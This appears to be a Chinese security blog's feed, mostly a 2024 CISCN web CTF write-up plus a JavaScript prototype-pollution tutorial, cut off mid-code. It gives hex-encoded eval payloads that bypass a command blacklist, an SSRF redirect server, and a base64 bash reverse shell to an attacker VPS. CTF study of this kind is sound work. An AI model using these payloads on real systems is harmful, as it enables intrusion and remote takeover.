c9143143bb6f139ac74a0dec1280ac3233a7634469ae4e5c6675d41778444b85f294694d4970e223acd2b238b2b7d7045cdd381fc1e2c6eb7f616615cd74d29da900afdb7031ffc068d90b2540a364a830efc27f2d2cfa65879b2c1f8f2be1fe2b918a0be3c768d2a7b69cae3e583d47b09465820c4fb9fb415b2ce5f4361e422e297cd0236d91de7c7acb7d8f38aedfa460f44d92ac787c85562bdd9a302adbdd3506088d1a28018d15a0bdc32a5701fc2cd12774d00613aa3cbd9b67acac86d974b2a383dfe699d77610456b8b4e2fb7bcc7acc6dc2bcf139edd6de0032a597ece83011586c2e3d4c22641e2786fb37f26d219abb39be2443a2f3e536aa0fcb81a0661afb50cc96e8b74a28d6ef62e2c6a24740026a2f799957002538d0d0a82da5f33180e37c7548d98e32015d1bb22d6a5569d133d6791d52efbceb74000c643777b42d5c37da147ad1d615cf031ba21b660f5eabda75566ee912a58130d25c1645767efc6b9ea76206dec6a5bdd789bafe7069592ee97c38ef4ad0e4fbe44182a1ee5a7a0412a6514a28c3c54bae7cc4941ed261476ae0b26fbef9172435e51f391b66adc32190e4f91487695dcb2ee0750a37ee48e898315466289e1bb492f043ba3b1bb3b81724cfc174d590b995054fb498773f137feb3925ccc54f4aea45c9e0f1e4a6251da38ff375e6a7626c7f936745c77450c40e4d74c5546fd80ddd906a9d7973a7d03f897b0a2ec49be71e0ebf56e5b3a00be6008d3ea99001511f2db645fe4ca79a2c66e0e1d75ddf44c67371a5f89e9251329e0c45dad16d1835963b7acd162f489d574b378b4a2bbed6de4a3aa5a468598b16355f94f3d3913c912c87d899020b4633e5b837efcde68e941af537c40007b598921fceab75ac6f8376f928fd6a02510c0c88858f935bbc8e30e7b318a51e3942c5abc9ca0bebac3c02b027874963f2d3bc0760c6c7c3ac51cd10f89082e87f12055be267ac89269489d6e5812b8c149cfcf1aeada5deb8ce0dc26ec922dd63f0890a4723bfff8eefa6b263f4520e3892d1b07d9ff05dacbc21198cadb87c3428444a77f40938925db1b92ba7a4d2ed77d7842cb5c849943e752b7caaa37e1f98b2ace2ac089d660a04a4ee9f704df8bb529633c97e4fe9771cf70013549063aa86c494706deb80bba275c1438ec14fe2d66f4de8e14f4eeae033667dca55e6b23fec6580eb006f925482e75e423dc011bcd166ad202c466ba0316a0701cd9acad67a90e22f05750f1f8d548209c65209e821de3edc0bbd078763fdec38b82cc53b81ea0de382b4ba9ee28ffd4d428a265ac05dcf5676e85284e261ea07361cc019727c4d9741e7e389e03da6c315c0a16840d5200b81c8fba9f7fe32b0ce542cac91d243229f77a405e02553c0f96ca9ccfc6907c8528d655a2be13415161600789ef3684fe6e786e443da4ccab8c73036802cf054d476f3c86048e5cc5f0007c90a46c5048c7a0e7f106aeea576d4899cded1fe06d5af6af25e66f96ad8452d78c2e27e3e411cc83c09ef9f4ec7282942eac6250d6816a8f5be179e6312c721600a5c4860716d5491555f648174b79b1b13d6cdcdd64b374b2b9e3dcdaa4f2f2bdfb0f1940294232359fcc98831e7d19a5c258339fce83ffee186352fe944d6b427e045b6a56c7ecb459a92f2e88debc683208c86841588a0ad4bd805c03cbd29cb051fdb1a973b5e6e677de339734e9ec035741db83b715db53d10710dfcf7673ba8cf2839a120df2fe40b1a8f2b7036d94969f84c6c68694ff5e2f4bd7876de998dd7e2903432fdbe5076a737dfc842a73045ee72e86f148fad31c5660973d12b6852e3841ef9bf93173c707564b33636cbdd44d4e7c277c94e0d20f1450409535643f9b8980772e67485751ee18154ad37af648dc8b4d0e826b3f1e67adc0154b2cac6d5962892da7483fdb13a2909667437d710b71a2db6618a5c042993bcf70bf2c523a4d0987b60026bfd71ea5cf4ec5e75473f2c049e1b2821d7251ec1f3979f22b2dedc52e878ff35c54dd6a115b104cb18c5f9e235e94d8870fc90840a751fc73410bc8fcb04343735d18c1d2a081cff6201e8a53ca1ca26b048541eeff3094f0abab1de39b3fb8cac7d10e3fd00fd74bfe8227d521fc06012020555cadef672316af2941e773673bdb15fd4f43da0b9b53a36643b152e332fd63d0f8518604e70d08b6b1950fafe85a1b40fdb12eb88a77deff1dbc990a0ceeec22ec335ef787ce02b13c930dddb27530a7c1002748dc4111c4557020b8cf9feb8da15c09b0dadff26054c5ce230bef93428506a3bf6beb4e47a1bef9bcccba6b682878b6bd1b0233d0596715a3f75a0147f47020ee4990ab31b02661006a3cd058f9539208f8143530e01fa86b94e63f329caa19b9ab858080106be05716f2a4d6cf4f38915d5696e469733550a2aa33437cf2c01eae6c54939b52f35e891e40056eabbd13a422be9ddfb64ea4979b2ef9c4acbd4c2019bcf889b7d035eb50297e43b11e448d318313490b5b897907b98063d4e4e8a2473961b46c9fc8737e700b674e53b7f37e8962272bb6f0045c86c05fee446355045cd3796099a4b55107cd03bdffab09c71488e7689131224ab08230c27a966e2ac8ff618c379e28761b1b2265585746ce6818c164fe5056de8d8eed0bd3a04ff4c7894c68c9051dc9e7baba1e1366d561091dd7f5be64476289432f057adcc910b15cea2e86311ee9d70082dd595f7d31b9782897aab3a79d39f65a480718b1c19a5db14c56fafc295166dd2d355f869fa8126b96a9a5cf46cd6da54c7ae073b4b046b99a7505611b22f8eca1ec203bb9ebc09de6fabb9bed2ddb3f47573180f064a979a0e52427331d087e35762dae43bafcbbd2f832f6b3e5651141a3c3bed01f3df81dee8ecc7e3a97115093dfec1afe0fa394823d702a2783b7b99b20c106e5be07cff7a8ac85b85901f702cf39a5c544f1c3c2fc34199</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JSC fuzz 教程</title>
      <link href="/2024/10/16/JSC%20fuzz%20%E6%95%99%E7%A8%8B/"/>
      <url>/2024/10/16/JSC%20fuzz%20%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="挖个坑先"><a href="#挖个坑先" class="headerlink" title="挖个坑先"></a>挖个坑先</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JS原型链污染</title>
      <link href="/2024/10/12/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-1/"/>
      <url>/2024/10/12/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-1/</url>
      
        <content type="html"><![CDATA[<h1 id="js原型链污染"><a href="#js原型链污染" class="headerlink" title="js原型链污染"></a>js原型链污染</h1><h2 id="什么是js原型-prototype"><a href="#什么是js原型-prototype" class="headerlink" title="什么是js原型(prototype)"></a>什么是js原型(prototype)</h2><p>要弄清这个问题，就要先弄清什么事类和对象。<br>类和对象是面向对象的编程语言中的几本概念。这里不进行详细阐述，简单的说，类可以实例化成为对象。二者内部都存在属性和方法。</p><p>现在来说原型。原型分为显式原型(prototype)和隐式原型(_<em>proto_</em>)。现在假定有一个类Foo和一个Foo类实例化得出的对象foo。我们可以通过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">FunctionName</span> = </span><br></pre></td></tr></table></figure><p>来定义原型。完成了定义后，就可以通过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.<span class="title class_">FunctionName</span>();</span><br></pre></td></tr></table></figure><p>来对定义好的函数来进行调用了。</p><p>而__proto__和prototype的关系为：foo.__proto__ &#x3D;&#x3D; Foo.prototype</p><p>总的来说，prototype是类的一个属性，而由该类实例化得到的对象都会拥有prototype的属性和方法。</p><h2 id="什么是js原型链"><a href="#什么是js原型链" class="headerlink" title="什么是js原型链"></a>什么是js原型链</h2><p><img src="/images/yxl.png" alt="img1"></p><p>这张图中可以看到，通过 __proto__ 可以一直往前找对象的原型，就形成了原型链。</p><p>而js在寻找属性时，如果在当前的对象中找不到，则会去对象的 __proto__ 中寻找。这个寻找机制就是原型继承链。</p><h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><p>前文中已经提到，我们可以通过对象的 __proto__ 来访问类的原型。那么如果我门修改一个类的对象的 __proto__ ，是否就可以控制该类的其他对象的属性了呢</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = &#123;bar : <span class="number">1</span>&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>);</span><br><span class="line"><span class="comment">//通过__proto__来修改属性bar的值</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>);</span><br></pre></td></tr></table></figure><p>运行这段代码可以发现，虽然zoo为一个空属性，但是输出其bar属性会发现结果为2。这就意味着我们通过一个对象来修改原型链，从而影响了其他的对象的属性。这就是js原型链污染的基本原理。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><h3 id="1-merge-x2F-copy函数"><a href="#1-merge-x2F-copy函数" class="headerlink" title="1.merge&#x2F;copy函数"></a>1.merge&#x2F;copy函数</h3><p>merge函数合并两个对象时，对于属性的值时对象或者数组的，merge会把他们的引用复制给目标对象。因此，在merge完成后，修改源对象的属性，目标对象的属性也会发生变化。</p><p>这里用ctfshow的题目做例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>这是题目登陆界面的源码，可以看到，这里把req.body也就是用户的请求内容copy到了user中，进行登陆。但是利用刚才的知识，如果传入一个</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__proto__&quot;</span> : &#123;</span><br><span class="line"><span class="string">&quot;ctfshow&quot;</span>:<span class="string">&quot;36dboy&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就可以做到就该secret的对象的效果，从而得到flag。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>一些知识点</title>
      <link href="/2024/07/11/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2024/07/11/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="一些乱七八糟的知识点"><a href="#一些乱七八糟的知识点" class="headerlink" title="一些乱七八糟的知识点"></a>一些乱七八糟的知识点</h1><h2 id="md5-str-true-漏洞"><a href="#md5-str-true-漏洞" class="headerlink" title="md5(str,true)漏洞"></a>md5(str,true)漏洞</h2><h2 id="print-r-global-“-”-遍历目录"><a href="#print-r-global-“-”-遍历目录" class="headerlink" title="print_r(global(“*”))遍历目录"></a>print_r(global(“*”))遍历目录</h2><h2 id="js大小写特性"><a href="#js大小写特性" class="headerlink" title="js大小写特性"></a>js大小写特性</h2><p>字符”ı”、”ſ” 经过toUpperCase处理后结果为 “I”、”S”</p><p>字符”K”经过toLowerCase处理后结果为”k”(这个K不是K)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2024 ciscn 华北赛区初赛试题复现</title>
      <link href="/2024/07/02/2024-ciscn-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%E5%88%9D%E8%B5%9B%E8%AF%95%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/07/02/2024-ciscn-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%E5%88%9D%E8%B5%9B%E8%AF%95%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="2024CISCN-web方向题目复现与知识点梳理"><a href="#2024CISCN-web方向题目复现与知识点梳理" class="headerlink" title="2024CISCN web方向题目复现与知识点梳理"></a>2024CISCN web方向题目复现与知识点梳理</h1><h2 id="1-simple-php"><a href="#1-simple-php" class="headerlink" title="1.simple_php"></a>1.simple_php</h2><p>非常狗的一道题<br>先看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过post方式传入cmd参数与题目环境交互。<br>传入的cmd被套了一层<strong>escapeshellcmd</strong>函数后赋值给cmd，接着进行一个黑名单过滤。非常全面的一个黑名单…几乎把所有能用的都过滤掉了。最后执行cmd的命令。</p><hr><p>很简单的代码逻辑，难处在于如何绕过这两次过滤。<br>先来看第一层过滤：escapeshellcmd</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">escapeshellcmd</span>(<span class="keyword">string</span> <span class="variable">$command</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>传入一个字符串参数，返回一个字符串参数。这是一个php自带的防止命令注入的函数，php文档对其的解释如下：</p><blockquote><p>“反斜线（\）会在以下字符之前插入：&amp;#;&#96;|*?~&lt;&gt;^()[]{}$\、\x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。”</p></blockquote><p>这也就导致这题难以通过特殊符号相关的方法来绕过黑名单，比如亦或的无符号rce等待。</p><p>下面的正则匹配就比较简单了。就是屏蔽了一些关键字。目前笔者发现还能用的命令有: man,diff,php,rev,paste,dd if&#x3D;</p><p>其中除了php以外都只能读取文件，diff命令比较好用的一点-r是他可以比较子目录中的文件。不过比较一番也没有找到。只能试着用php命令去连接数据可试试了。这里给出php命令的解释和使用方式。</p><pre><code>&gt;-r 执行代码，无需脚本标记 &gt;-f 执行文件</code></pre><p>个人感觉比较常用的以上两个选项。这里可以用php -r来执行代码。<br>测试php -r phpinfo();发现可以跑通</p><p><img src="/images/img_simphp.png" alt="img1"></p><p>但是如果使用system执行系统命令，还是会被上面的黑名单过滤，(甚至连引号都过滤掉了)因此使用hex2bin函数来进行绕过。hex2bin可以把输入的十六进制ascii码转换为字符串。这里先给出payload再做解释</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(_hex,<span class="number">1</span>)));</span><br></pre></td></tr></table></figure><p>eval就不做解释了。这里主要解释为什么hex2bin里面要套一个substr。substr()函数输入三个参数：string,start,length。分别是待处理的字符串，开始位置，截取长度。第三个参数可以缺省，即输出从开始位置到结束的所有字符串。</p><p>这里调用这个函数的主要目的是：在没有但双引号的情况下，构造字符串。因为hex2bin的输入要求是引号包裹的字符串，但这里把引号ban了，就要用到substr了。substr允许输入没有引号包裹的字符串，并且输出一个字符串。这也就是说我们可以借用substr来实现无引号字符串的构建。测试一下whoami，发现正常回显，呢么接下来就是无聊的查库时间了。</p><p><img src="/images/simphp_test.png" alt="img1"></p><p>这个地方没啥技术含量，直接给出最终payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php -r <span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b,<span class="number">1</span>)));</span><br></pre></td></tr></table></figure><h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>这个题真是必须要看到hint才知道怎么做，hint提示flag.php的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;</span>;</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个地方 REMOTE_ADDR 是没办法通过文件头伪造的。那就只能试一试ssrf了。</p><p>这道题ssrf的思路是这样：通过一个借口来访问一个恶意服务器，恶意服务器302将请求跳转到访问者本地的flag.php来通过 REMOTE_ADDR 的检测。</p><p>github上找一下源码，审计一下（其实这里有已经纰漏的漏洞，但是当时没找到，只能审了）搜了一下ssrf出发漏洞的常见函数，里面有一个file_get_contents()。找一下这个函数参数可控的地方。找到了如下代码：</p><p><img src="/images/dr.png" alt="img3"></p><p>继续寻找这个函数参数可控的地方：</p><p><img src="/images/qrcode.png" alt="img4"></p><p>这个地方的url是get方法传入的，很有戏。继续找，最终找到了这个地方：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dr_qrcode</span>(<span class="params"><span class="variable">$text</span>, <span class="variable">$thumb</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$level</span> = <span class="string">&#x27;H&#x27;</span>, <span class="variable">$size</span> = <span class="number">5</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ROOT_URL.<span class="string">&#x27;index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$thumb</span>).<span class="string">&#x27;&amp;text=&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$text</span>).<span class="string">&#x27;&amp;size=&#x27;</span>.<span class="variable">$size</span>.<span class="string">&#x27;&amp;level=&#x27;</span>.<span class="variable">$level</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么理论上讲访问这个url，控制下thumb的值就可以访问到咱们的恶意服务器了。在服务器上部署一个302跳转站，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect,request,send_file</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    cmd= <span class="string">&quot;cmd&quot;</span></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;http://127.0.0.1/flag.php?cmd=&quot;</span>+cmd)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>不熟之后本地访问一下，跳转到flag.php就说明已经成功部署了。这也就不难理解为什么这个服务可以通过flag.php的检测了。由于没有回显，需要弹一下shell。</p><p>这里用到弹shell的姿势如下：</p><blockquote><p>quote(“bash -c ‘{echo,base64_str}|{base64,-d}|{bash,-i}’”)</p></blockquote><p>其中，base64_str加密的内容如下：</p><blockquote><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</p></blockquote><p>接着按照上面的url访问&#x2F;index.php?s&#x3D;api&amp;c&#x3D;api&amp;m&#x3D;qrcode&amp;thumb&#x3D;<a href="http://vps:port&amp;&amp;text=foo&amp;size=1&amp;level=1即可">http://vps:port&amp;&amp;text=foo&amp;size=1&amp;level=1即可</a></p><h2 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="comment">#将user赋值为cookie中的user</span></span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line">    <span class="comment">#如果user为&#x27;adm;n&#x27;就把session中的admin项赋值为true</span></span><br><span class="line">    <span class="comment">#但问题是，cookie中的分号会被视为两个值之间的分割</span></span><br><span class="line">    <span class="comment">#这是第一个要解决的问题</span></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"><span class="comment">#成功登陆后可以污染这里的file文件来达到任意文件读取</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span 